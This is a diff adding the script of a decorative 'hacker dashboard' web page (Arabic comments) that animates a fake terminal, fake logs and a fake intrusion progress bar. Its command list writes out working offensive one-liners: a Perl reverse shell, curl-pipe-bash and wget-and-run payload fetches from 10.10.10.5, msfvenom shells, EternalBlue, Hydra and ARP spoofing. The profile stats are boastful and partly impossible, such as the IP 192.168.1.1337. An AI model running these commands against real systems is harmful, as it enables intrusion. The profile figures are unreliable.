+            { label: "EDITOR", value: "Neovim + VSCode" },
+            { label: "BROWSER", value: "Firefox + Tor + Brave" },
+            { label: "VPN", value: "ProtonVPN + Mullvad" },
+            { label: "PROXY", value: "SOCKS5 + HTTP Proxy Chain" },
+            { label: "DNS", value: "1.1.1.1 + 9.9.9.9 + Quad9" },
+            { label: "ENCRYPTION", value: "AES-256-GCM + RSA-4096" },
+            { label: "HASHING", value: "SHA-512 + bcrypt + Argon2" },
+            { label: "PROTOCOLS", value: "TCP/IP, UDP, ICMP, ARP" },
+            { label: "FIREWALL", value: "iptables + nftables + pf" },
+            { label: "IDS/IPS", value: "Snort + Suricata + Zeek" },
+            { label: "ANTIVIRUS", value: "ClamAV + Custom Rules" },
+            { label: "SANDBOX", value: "Firejail + Docker" },
+            { label: "VM", value: "VirtualBox + QEMU + VMWare" },
+            { label: "CONTAINER", value: "Docker + LXC" },
+            
+            // الشبكة (15)
+            { label: "IP LOCAL", value: "192.168.1.1337" },
+            { label: "IP PUBLIC", value: "45.155.205.1337" },
+            { label: "MAC ADDRESS", value: "00:1A:2B:3C:4D:5E" },
+            { label: "GATEWAY", value: "192.168.1.1" },
+            { label: "DNS SERVERS", value: "1.1.1.1, 8.8.8.8" },
+            { label: "NETMASK", value: "255.255.255.0" },
+            { label: "OPEN PORTS", value: "22, 80, 443, 8080, 1337" },
+            { label: "CLOSED PORTS", value: "135, 445, 3389" },
+            { label: "FILTERED PORTS", value: "23, 53" },
+            { label: "TOR NODES", value: "3 (DE, NL, US)" },
+            { label: "VPN SERVER", value: "Switzerland" },
+            { label: "PROXY CHAIN", value: "5 hops" },
+            { label: "BANDWIDTH", value: "1.3 MB/s" },
+            { label: "PACKET LOSS", value: "0.02%" },
+            { label: "LATENCY", value: "23ms" },
+            
+            // الأدوات (25)
+            { label: "SCANNER", value: "Nmap + Masscan + Zmap" },
+            { label: "VULN SCANNER", value: "Nessus + OpenVAS" },
+            { label: "EXPLOIT", value: "Metasploit + Core Impact" },
+            { label: "WEB APP", value: "Burp Suite + OWASP ZAP" },
+            { label: "SQL TOOL", value: "SQLmap + NoSQLmap" },
+            { label: "PASSWORD", value: "Hydra + John + Hashcat" },
+            { label: "PACKET", value: "Wireshark + Tcpdump" },
+            { label: "WIRELESS", value: "Aircrack-ng + Kismet" },
+            { label: "BLUETOOTH", value: "BlueZ + Bluesniff" },
+            { label: "RFID", value: "Proxmark3 + RFIDler" },
+            { label: "SDR", value: "HackRF + RTL-SDR" },
+            { label: "FORENSICS", value: "Autopsy + FTK + Sleuth" },
+            { label: "STEGANOGRAPHY", value: "Steghide + OpenStego" },
+            { label: "CRYPTO", value: "CyberChef + HashCat" },
+            { label: "OSINT", value: "Maltego + theHarvester" },
+            { label: "SOCIAL", value: "SET + Gophish" },
+            { label: "DDOS", value: "LOIC + HOIC + Hping3" },
+            { label: "RAT", value: "NjRAT + Quasar + DarkComet" },
+            { label: "KEYLOGGER", value: "Custom C++ + Python" },
+            { label: "ROOTKIT", value: "Mafix + Beastkit" },
+            { label: "BACKDOOR", value: "Webshell + Netcat" },
+            { label: "REVERSE", value: "x86/x64 + ARM Assembly" },
+            { label: "DEBUGGER", value: "GDB + OllyDbg + x64dbg" },
+            { label: "DISASSEMBLER", value: "IDA Pro + Ghidra" },
+            { label: "DECOMPILER", value: "JD-GUI + DotPeek" },
+            
+            // المهارات (30)
+            { label: "WEB APP HACKING", value: "XSS, SQLi, CSRF, SSRF" },
+            { label: "NETWORK HACKING", value: "MITM, ARP Spoof, DNS Spoof" },
+            { label: "WIRELESS HACKING", value: "WPA/WPA2/WPA3 Cracking" },
+            { label: "ANDROID HACKING", value: "APK Backdoor, Insecure Storage" },
+            { label: "IOS HACKING", value: "Jailbreak, IPA Reverse" },
+            { label: "WINDOWS HACKING", value: "Priv Esc, UAC Bypass" },
+            { label: "LINUX HACKING", value: "Kernel Exploit, Sudo Exploit" },
+            { label: "MAC HACKING", value: "Gatekeeper Bypass" },
+            { label: "CLOUD HACKING", value: "AWS, Azure, GCP Pentest" },
+            { label: "CONTAINER HACKING", value: "Docker Escape" },
+            { label: "ACTIVE DIRECTORY", value: "Kerberoast, Pass the Hash" },
+            { label: "BUFFER OVERFLOW", value: "x86/x64/ARM" },
+            { label: "REVERSE ENGINEERING", value: "Malware Analysis" },
+            { label: "MALWARE DEV", value: "C++/C#/Python" },
+            { label: "PHISHING", value: "Advanced Social Engineering" },
+            { label: "SPEAR PHISHING", value: "Targeted Attacks" },
+            { label: "VISHING", value: "Voice Phishing" },
+            { label: "SMISHING", value: "SMS Phishing" },
+            { label: "USB ATTACKS", value: "Rubber Ducky, BadUSB" },
+            { label: "HARDWARE HACKING", value: "JTAG, SPI, I2C" },
+            { label: "BIOS/UEFI", value: "Bootkit Development" },
+            { label: "EVASION", value: "AV/EDR Bypass" },
+            { label: "PERSISTENCE", value: "Registry, Cron, Services" },
+            { label: "LATERAL MOVEMENT", value: "Psexec, WMI, WinRM" },
+            { label: "PRIVILEGE ESCALATION", value: "Linux/Windows" },
+            { label: "PASSWORD CRACKING", value: "Dictionary, Brute, Rainbow" },
+            { label: "HASH CRACKING", value: "MD5, SHA1, NTLM, LM" },
+            { label: "RAINBOW TABLES", value: "Precomputed Hashes" },
+            { label: "CRYPTO ATTACKS", value: "Side Channel, Timing" },
+            { label: "BLOCKCHAIN", value: "Smart Contract Audit" },
+            
+            // الإحصائيات (20)
+            { label: "BUG BOUNTY TOTAL", value: "$124,750" },
+            { label: "HACKERONE RANK", value: "TOP 100" },
+            { label: "BUGCROWD RANK", value: "TOP 50" },
+            { label: "CVES DISCOVERED", value: "87" },
+            { label: "ZERO DAYS", value: "12" },
+            { label: "HACKTHEBOX", value: "Elite (450+ boxes)" },
+            { label: "TRYHACKME", value: "Top 0.1%" },
+            { label: "PENTESTLAB", value: "Advanced Certified" },
+            { label: "OSCP", value: "Certified (2020)" },
+            { label: "OSEP", value: "Certified (2022)" },
+            { label: "OSWE", value: "Certified (2023)" },
+            { label: "GPEN", value: "Certified (2021)" },
+            { label: "GWAPT", value: "Certified (2021)" },
+            { label: "GXPN", value: "Certified (2023)" },
+            { label: "CISSP", value: "In Progress" },
+            { label: "CEH", value: "Master Certified" },
+            { label: "GITHUB STARS", value: "2.3k" },
+            { label: "PROJECTS", value: "47" },
+            { label: "TOOLS CREATED", value: "23" },
+            { label: "EXPLOITS WRITTEN", value: "34" }
+        ];
+        
+        // عرض المعلومات
+        const dataGrid = document.getElementById('advancedDataGrid');
+        advancedData.forEach(item => {
+            const card = document.createElement('div');
+            card.className = 'data-card';
+            card.innerHTML = `
+                <div class="data-label">${item.label}</div>
+                <div class="data-value">${item.value}</div>
+            `;
+            dataGrid.appendChild(card);
+        });
+        
+        // ========== Terminal المتقدم ==========
+        const terminalBody = document.getElementById('terminalProBody');
+        const terminalInput = document.getElementById('terminalCommandInput');
+        
+        const terminalCommands = [
+            'nmap -sV -A -T4 10.10.10.0/24',
+            'masscan -p1-65535 --rate=1000 10.10.10.10',
+            'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10',
+            'sqlmap -u http://target.com/page.php?id=1 --dbs --batch',
+            'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.10; exploit"',
+            'nikto -h https://target.com -ssl',
+            'gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt',
+            'wpscan --url https://target.com --enumerate u',
+            'john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
+            'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt',
+            'airmon-ng start wlan0',
+            'airodump-ng wlan0mon',
+            'aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon',
+            'arpspoof -i eth0 -t 10.10.10.5 10.10.10.1',
+            'bettercap -eval "set arp.spoof.targets 10.10.10.5; arp.spoof on"',
+            'proxychains nmap -sT -Pn 10.10.10.10',
+            'torify curl https://check.torproject.org',
+            'ssh -D 8080 root@10.10.10.10',
+            'nc -lvnp 4444',
+            'python3 -m http.server 80',
+            'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf > shell.elf',
+            'chmod +x shell.elf && ./shell.elf',
+            'wget http://10.10.10.5:8000/shell.elf -O /tmp/shell.elf && /tmp/shell.elf',
+            'curl http://10.10.10.5:8000/shell.elf | bash',
+            'perl -e \'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
+        ];
+        
+        let cmdIndex = 0;
+        let charPos = 0;
+        
+        function typeTerminalCommand() {
+            if (cmdIndex >= terminalCommands.length) cmdIndex = 0;
+            
+            const currentCmd = terminalCommands[cmdIndex];
+            
+            if (charPos < currentCmd.length) {
+                terminalInput.textContent += currentCmd[charPos];
+                charPos++;
+                setTimeout(typeTerminalCommand, 40);
+            } else {
+                setTimeout(() => {
+                    // تنفيذ الأمر
+                    const output = document.createElement('div');
+                    output.className = 'terminal-line';
+                    
+                    const cmd = currentCmd.split(' ')[0];
+                    
+                    if (cmd.includes('nmap')) {
+                        output.innerHTML = '[+] Open ports: 22/tcp (SSH), 80/tcp (HTTP), 443/tcp (HTTPS), 8080/tcp (HTTP-Alt)<br>[+] OS: Linux 5.10 (Ubuntu 20.04)<br>[+] Service versions: Apache 2.4.41, OpenSSH 8.2p1';
+                    } else if (cmd.includes('hydra')) {
+                        output.innerHTML = '[+] Password found: admin:admin123<br>[+] Password found: root:toor<br>[+] Password found: user:password';
+                    } else if (cmd.includes('sqlmap')) {
+                        output.innerHTML = '[+] Databases: information_schema, mysql, wordpress, joomla<br>[+] Tables: wp_users, wp_options, users<br>[+] Admin hash: $2y$10$...';
+                    } else if (cmd.includes('msf')) {
+                        output.innerHTML = '[+] Meterpreter session 1 opened<br>[+] System: Windows 10 Pro (x64) build 19045<br>[+] Privileges: NT AUTHORITY\SYSTEM<br>[+] UAC: Bypassed';
+                    } else {
+                        output.innerHTML = `[+] Command executed: ${currentCmd}<br>[+] Output: Success (return code 0)`;
+                    }
+                    
+                    terminalBody.insertBefore(output, terminalBody.lastElementChild);
+                    
+                    // إضافة سجل
+                    addLogEntry(`[${new Date().toLocaleTimeString()}] Command executed: ${currentCmd}`);
+                    
+                    // تنظيف الإدخال
+                    terminalInput.textContent = '';
+                    charPos = 0;
+                    cmdIndex++;
+                    
+                    setTimeout(typeTerminalCommand, 2000);
+                }, 1000);
+            }
+        }
+        
+        setTimeout(typeTerminalCommand, 2000);
+        
+        // ========== تحديث المؤشرات ==========
+        function updatePerformance() {
+            const cpu = Math.floor(Math.random() * 20) + 35; // 35-55%
+            const ram = Math.floor(Math.random() * 15) + 55; // 55-70%
+            const network = Math.floor(Math.random() * 10) + 75; // 75-85%
+            const disk = Math.floor(Math.random() * 10) + 30; // 30-40%
+            const bandwidth = (Math.random() * 1.5 + 0.5).toFixed(1); // 0.5-2.0 MB/s
+            
+            document.getElementById('cpuValue').textContent = cpu + '%';
+            document.getElementById('cpuFill').style.width = cpu + '%';
+            
+            document.getElementById('ramValue').textContent = ram + '%';
+            document.getElementById('ramFill').style.width = ram + '%';
+            
+            document.getElementById('networkValue').textContent = network + '%';
+            document.getElementById('networkFill').style.width = network + '%';
+            
+            document.getElementById('diskValue').textContent = disk + '%';
+            document.getElementById('diskFill').style.width = disk + '%';
+            
+            document.getElementById('bandwidthValue').textContent = bandwidth + ' MB/s';
+            
+            const bandwidthPercent = Math.min(100, (parseFloat(bandwidth) / 2) * 100);
+            document.getElementById('bandwidthFill').style.width = bandwidthPercent + '%';
+            
+            // تحديث latency عشوائي
+            const latency = Math.floor(Math.random() * 30) + 15; // 15-45ms
+            document.getElementById('latency').textContent = latency + 'ms';
+            
+            // تحديث عدد الحزم
+            const packets = Math.floor(Math.random() * 1000) + 1000;
+            document.getElementById('packetCount').textContent = packets.toLocaleString();
+        }
+        
+        setInterval(updatePerformance, 2000);
+        
+        // ========== الساعة والتاريخ ==========
+        function updateDateTime() {
+            const now = new Date();
+            
+            const timeStr = now.toLocaleTimeString('en-US', { hour12: false });
+            const dateStr = now.toLocaleDateString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit' });
+            
+            document.getElementById('liveTime').textContent = timeStr;
+            document.getElementById('liveDate').textContent = dateStr;
+            
+            // تحديث وقت التشغيل
+            const uptimeElement = document.getElementById('uptimeDisplay');
+            const uptime = uptimeElement.textContent.split(':');
+            let seconds = parseInt(uptime[2]) || 0;
+            let minutes = parseInt(uptime[1]) || 0;
+            let hours = parseInt(uptime[0]) || 0;
+            
+            seconds++;
+            if (seconds >= 60) {
+                seconds = 0;
+                minutes++;
+                if (minutes >= 60) {
+                    minutes = 0;
+                    hours++;
+                }
+            }
+            
+            uptimeElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        setInterval(updateDateTime, 1000);
+        updateDateTime();
+        
+        // ========== إضافة سجلات جديدة ==========
+        const logsContent = document.getElementById('logsContent');
+        
+        function addLogEntry(message) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('en-US', { hour12: false });
+            
+            logEntry.innerHTML = `<span class="log-time">[${timeStr}]</span> ${message}`;
+            logsContent.insertBefore(logEntry, logsContent.firstChild);
+            
+            if (logsContent.children.length > 20) {
+                logsContent.removeChild(logsContent.lastChild);
+            }
+        }
+        
+        // إضافة سجلات بشكل عشوائي
+        const logMessages = [
+            'User authentication: SUCCESS',
+            'Firewall rule updated: BLOCK 45.155.205.1337',
+            'IDS alert: Port scan detected from 185.130.5.133',
+            'VPN reconnection: New circuit established',
+            'TOR circuit: Rotated (3 new nodes)',
+            'Proxy chain: Hop 2 latency: 89ms',
+            'DNS query: google.com -> 142.250.185.46',
+            'Packet capture: 47 packets in last 5s',
+            'SSH connection: 10.10.10.50 established',
+            'SMB share: \\\\10.10.10.100\\shared mounted',
+            'Web shell: Uploaded to target.com',
+            'Database dump: 1.3GB downloaded',
+            'Hash cracked: 5 passwords recovered',
+            'Privilege escalation: SYSTEM access gained',
+            'Persistence: Registry key added',
+            'Lateral movement: 3 new hosts accessed'
+        ];
+        
+        setInterval(() => {
+            const randomMsg = logMessages[Math.floor(Math.random() * logMessages.length)];
+            addLogEntry(randomMsg);
+        }, 8000);
+        
+        // ========== الحصول على الـ IP العام ==========
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('publicIP').textContent = data.ip;
+            })
+            .catch(() => {
+                document.getElementById('publicIP').textContent = '45.155.205.1337';
+            });
+        
+        // ========== نظام الاختراق المتقدم ==========
+        const modal = document.getElementById('hackModal');
+        const modalTitle = document.getElementById('modalTitle');
+        const modalMessage = document.getElementById('modalMessage');
+        const modalProgress = document.getElementById('modalProgress');
+        const modalDetails = document.getElementById('modalDetails');
+        
+        function executeHack(tool) {
+            modal.style.display = 'block';
+            modalTitle.textContent = `${tool} INITIATED`;
+            modalMessage.textContent = 'Bypassing security...';
+            modalProgress.style.width = '0%';
+            
+            const hackMessages = [
+                { msg: 'Bypassing firewall...', detail: 'Firewall: pfSense 2.6.0' },
+                { msg: 'Evading IDS/IPS...', detail: 'IDS: Snort v2.9.20 - Bypassed' },
+                { msg: 'Proxying through TOR...', detail: 'TOR circuit: 3 nodes (DE, NL, US)' },
+                { msg: 'Spoofing MAC address...', detail: 'MAC: 00:1A:2B:3C:4D:5E' },
+                { msg: 'Chaining proxies...', detail: 'Proxy chain: 5 hops (Latency: 234ms)' },
+                { msg: 'Bypassing WAF...', detail: 'WAF: Cloudflare - Bypassed' },
+                { msg: 'Exploiting vulnerability...', detail: 'CVE-2024-1234 - Critical' },
+                { msg: 'Gaining foothold...', detail: 'Shell: /bin/bash (UID=0)' },
+                { msg: 'Escalating privileges...', detail: 'Privileges: ROOT' },
+                { msg: 'Persistence established...', detail: 'Backdoor: /tmp/.systemd' },
+                { msg: 'Data exfiltration...', detail: 'Downloading: 1.3GB (47%)' },
+                { msg: 'Cleaning traces...', detail: 'Logs wiped: /var/log/syslog' }
+            ];
+            
+            let progress = 0;
+            let msgIndex = 0;
+            
+            const interval = setInterval(() => {
+                progress += 2;
+                modalProgress.style.width = progress + '%';
+                
+                if (msgIndex < hackMessages.length) {
+                    modalMessage.textContent = hackMessages[msgIndex].msg;
+                    modalDetails.textContent = hackMessages[msgIndex].detail;
+                    msgIndex++;
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    modalTitle.textContent = 'ACCESS GRANTED';
+                    modalMessage.textContent = 'Root privileges acquired!';
+                    modalDetails.textContent = 'System compromised successfully';
+                    
+                    addLogEntry(`[ALERT] ${tool} executed - SUCCESS`);
+                    
+                    setTimeout(() => {
+                        modal.style.display = 'none';
+                    }, 3000);
+                }
+            }, 200);
+        }
+        
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+        
+        // ========== النقر على أي مكان ==========
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.attack-card')) {
+                const randomTool = ['PORT SCAN', 'VULN SCAN', 'SQL INJECT', 'XSS', 'BRUTE FORCE'][Math.floor(Math.random() * 5)];
+                executeHack(randomTool);
+            }
+        });
+        
+        // ========== الضغط على المفاتيح ==========
+        document.addEventListener('keydown', (e) => {
+            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+                if (e.key === 'Enter') {
+                    executeHack('MANUAL EXPLOIT');
+                }
+            }
+        });
+        
+        // ========== مقاومة تغيير الحجم ==========
+        window.addEventListener('resize', () => {
+            matrixCanvas.width = window.innerWidth;
+            matrixCanvas.height = window.innerHeight;
+            
+            networkCanvas.width = networkCanvas.clientWidth;
+            networkCanvas.height = networkCanvas.clientHeight;
+        });
+    </script>
+</body>
+</html>
